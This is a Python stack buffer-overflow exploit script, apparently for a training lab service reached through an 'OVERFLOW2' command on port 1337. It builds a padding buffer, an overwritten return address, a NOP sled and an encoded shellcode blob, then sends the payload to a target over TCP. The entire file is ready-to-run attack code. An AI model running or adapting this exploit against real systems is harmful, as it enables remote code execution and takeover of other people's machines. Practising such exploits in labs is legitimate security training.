import socket, sys, time


ip = '10.0.2.57'	# Change this
port = 1337		# Change this

buffer = b'OVERFLOW2 '
buffer += b'A' * 634
retn = b'\xaf\x11\x50\x62'
padding = b'\x90' * 16
shellcode =  b""
shellcode += b"\xfc\xbb\xa7\x4c\x16\xb4\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\x5b\xa4\x94\xb4\xa3\x35\xf9\x3d"
shellcode += b"\x46\x04\x39\x59\x03\x37\x89\x29\x41\xb4\x62"
shellcode += b"\x7f\x71\x4f\x06\xa8\x76\xf8\xad\x8e\xb9\xf9"
shellcode += b"\x9e\xf3\xd8\x79\xdd\x27\x3a\x43\x2e\x3a\x3b"
shellcode += b"\x84\x53\xb7\x69\x5d\x1f\x6a\x9d\xea\x55\xb7"
shellcode += b"\x16\xa0\x78\xbf\xcb\x71\x7a\xee\x5a\x09\x25"
shellcode += b"\x30\x5d\xde\x5d\x79\x45\x03\x5b\x33\xfe\xf7"
shellcode += b"\x17\xc2\xd6\xc9\xd8\x69\x17\xe6\x2a\x73\x50"
shellcode += b"\xc1\xd4\x06\xa8\x31\x68\x11\x6f\x4b\xb6\x94"
shellcode += b"\x6b\xeb\x3d\x0e\x57\x0d\x91\xc9\x1c\x01\x5e"
shellcode += b"\x9d\x7a\x06\x61\x72\xf1\x32\xea\x75\xd5\xb2"
shellcode += b"\xa8\x51\xf1\x9f\x6b\xfb\xa0\x45\xdd\x04\xb2"
shellcode += b"\x25\x82\xa0\xb9\xc8\xd7\xd8\xe0\x86\x26\x6e"
shellcode += b"\x9f\xe5\x29\x70\x9f\x59\x42\x41\x14\x36\x15"
shellcode += b"\x5e\xff\x72\xf9\xbc\xd5\x8e\x92\x18\xbc\x32"
shellcode += b"\xff\x9a\x6b\x70\x06\x19\x99\x09\xfd\x01\xe8"
shellcode += b"\x0c\xb9\x85\x01\x7d\xd2\x63\x25\xd2\xd3\xa1"
shellcode += b"\x46\xb5\x47\x29\xa6\x50\xe0\xc8\xb6\x9a\x10"
shellcode += b"\x13\xb6\x9a\x10\x13"

payload = buffer + retn + padding + shellcode

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        s.connect((ip, port))
        #s.recv(1024)
        print('Sending payload')
        s.send(payload)
        s.recv(1024)
except Exception as e:
    print(e)
    sys.exit(0)
